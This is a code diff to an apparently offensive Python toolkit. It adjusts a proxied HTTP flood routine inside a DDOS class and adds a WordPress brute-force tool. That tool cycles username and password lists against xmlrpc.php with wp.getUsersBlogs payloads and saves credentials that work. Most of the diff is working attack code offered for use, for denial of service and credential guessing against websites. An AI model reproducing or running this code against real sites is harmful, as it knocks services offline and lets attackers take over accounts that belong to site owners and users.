@@ -5,7 +5,7 @@
 global user_agents
 user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
-import cloudscraper, requests, httpx, time, os, socket, socks, ssl, threading, random, struct, sys
+import cloudscraper, requests, httpx, time, os, socket, socks, ssl, threading, random, struct, sys, colorama, re
 from bs4 import BeautifulSoup
 from urllib.parse import *
 from requests.cookies import RequestsCookieJar
@@ -13,8 +13,13 @@ import undetected_chromedriver as webdriver
 import fake_useragent
 from sys import *
 from fake_useragent import UserAgent
+from colorama import *
 
 ############################################################################################################################################################################################################################################################################################################################################################################
+
+global success, info, fail
+success, info, fail = Fore.GREEN + Style.BRIGHT, Fore.YELLOW + \
+    Style.BRIGHT, Fore.RED + Style.BRIGHT
 red = '\033[1;91m'
 white = '\033[0m'
 green = '\033[1;32m'
@@ -24,6 +29,25 @@ red_t = '\033[0;31;40m'
 gray = '\033[1;37;40m'
 gold = '\033[0;33m'
 purple = '\033[1;35m'
+class color():
+    def white():
+        white = '\033[0m'
+        return white
+    def gold():
+        gold = '\033[0;33m'
+        return gold
+    def yellow():
+        yellow = '\033[1;33m'
+        return yellow
+    def red():
+        red = '\033[1;91m'
+        return red
+    def green():
+        green = '\033[1;32m'
+        return green
+    def purple():
+        purple = '\033[1;35m'
+        return purple
 def makedir():
     try:
         os.mkdir('LOGS')
@@ -199,32 +223,35 @@ class DDOS():
                     ts = threading.Thread(target=LSKY, args=(url, t))
                     ts.start()
             def LSKY(url, t):
-                ua = random.choice(user_agents)
-                req = "GET / HTTP/1.1\r\nHost: {}\r\n".format(urlparse(url))
-                req += "Connection: keep-alive\r\n"
-                req += "User-Agent: {}\r\n".format(ua)
-                req += "Cache-Control: no-cache\r\n"
-                req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
-                req += "Sec-Fetch-Site: same-origin\r\n"
-                req += "Sec-GPC: 1\r\n"
-                req += "Upgrade-Insecure-Requests: 10\r\n"
-                req += "Content-Length: 1000\r\n"
-                if int(t) > 0:
-                    try:
-                        proxy = random.choice(proxzy).strip().split(":")
-                        s = socks.socksocket()
-                        s.connect((str(urlparse(url).netloc), int(443)))
-                        s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-                        zzl = ssl.SSLContext()
-                        s = zzl.wrap_socket(s, server_hostname=urlparse(url).netloc)
-                        s.send(str(req).encode())
+                try:
+                    ua = random.choice(user_agents)
+                    req = "GET / HTTP/1.1\r\nHost: {}\r\n".format(urlparse(url))
+                    req += "Connection: keep-alive\r\n"
+                    req += "User-Agent: {}\r\n".format(ua)
+                    req += "Cache-Control: no-cache\r\n"
+                    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
+                    req += "Sec-Fetch-Site: same-origin\r\n"
+                    req += "Sec-GPC: 1\r\n"
+                    req += "Upgrade-Insecure-Requests: 10\r\n"
+                    req += "Content-Length: 1000\r\n"
+                    if int(t) > 0:
                         try:
-                            for _ in range(200):
-                                s.send(str(req).encode())
+                            proxy = random.choice(proxzy).strip().split(":")
+                            s = socks.socksocket()
+                            s.connect((str(urlparse(url).netloc), int(443)))
+                            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+                            zzl = ssl.SSLContext()
+                            s = zzl.wrap_socket(s, server_hostname=urlparse(url).netloc)
+                            s.send(str(req).encode())
+                            try:
+                                for _ in range(200):
+                                    s.send(str(req).encode())
+                            except:
+                                s.close()
                         except:
                             s.close()
-                    except:
-                        s.close()
+                except Exception:
+                    pass
             if __name__ == '__main__':
                 url, threadsi, t = layer7_target()
                 timer = threading.Thread(target=countdown, args=(t,))
@@ -942,6 +969,82 @@ class TOOLS():
             url = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL             "+'\033[1;35m'+': '+'\033[0m')
             savelog(url)
             print("LOGS are saved in folder 'LOGS' ")
+    class __function__():
+        def wp_bruteforce():
+            xml_path = '/xmlrpc.php'
+            def start_brute(url_file, file_name):
+                with open(url_file, 'r') as f:
+                    urls = f.readline()
+                site = urls
+                list = site.split()
+                for url in list:
+                    def url_test(url):
+                        if 'https://' in url:
+                            pass
+                        elif 'http://' in url:
+                            pass
+                        else:
+                            try:
+                                url = 'https://'+url
+                            except Exception:
+                                url = 'http://'+url
+                        if '/wp-login.php' in url:
+                            url = url.replace('/wp-login.php', xml_path)
+                        elif xml_path in url:
+                            pass
+                        else:
+                            url = url + xml_path
+                        print(f'{color.green()}Url Are Parsed: {color.white()}', url)
+                        return url
+                    url = url_test(url)
+                    def bypass():
+                        with open(file_name, 'rb') as files:
+                            files_content = files.readlines()
+                        nick_lines = files_content
+                        password_lines = files_content
+                        while True:
+                            for nick in nick_lines:
+                                for password in password_lines:
+                                    try:
+                                            # Membuat payload untuk data login
+                                        xml_payload = """
+                                        <methodCall>
+                                            <methodName>wp.getUsersBlogs</methodName>
+                                            <params>
+                                                <param><value>{}</value></param>
+                                                <param><value>{}</value></param>
+                                            </params>
+                                        </methodCall>
+                                        """.format(nick, password)
+
+                                        # Melakukan permintaan POST untuk login
+                                        process = f"---------------------------\nTrying Nick: {nick}\nPassword: {password}\nUrl: {url}\n---------------------------\n\n"
+                                        print(process, end='\r')
+                                        response = requests.post(url, data=xml_payload, timeout=10)
+                                        keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' or 'blogName'
+                                        if re.search(keyword, response.text, re.IGNORECASE):
+                                                payload = '{}#{}@{}'.format(url, nick, password)
+                                                print(success + f'Login Success !')
+                                                print(response)
+                                                def log(url):
+                                                    file = open((url) + ".txt", "a")
+                                                    file.write(str(payload))
+                                                    file.write("\n")
+                                                    file.close
+                                                log(url)
+                                        else:
+                                            print(fail + f'Login Failed.')
+                                            print(response)
+                                    except requests.exceptions.ReadTimeout:
+                                        print("Request Timed Out, Please Wait..")
+                                        time.sleep(60)
+                                        continue
+                                print(success + f"[ + ] Done.. [ + ]")
+                    bypass()
+            if __name__ == '__main__':
+                url_file = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"URL FILE LIST             "+'\033[1;35m'+': '+'\033[0m')
+                file_name = input(""+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"USN & PASS FILE LIST     "+'\033[1;35m'+': '+'\033[0m')
+                start_brute(url_file, file_name)
 class main():
     def main():
         logo.main()
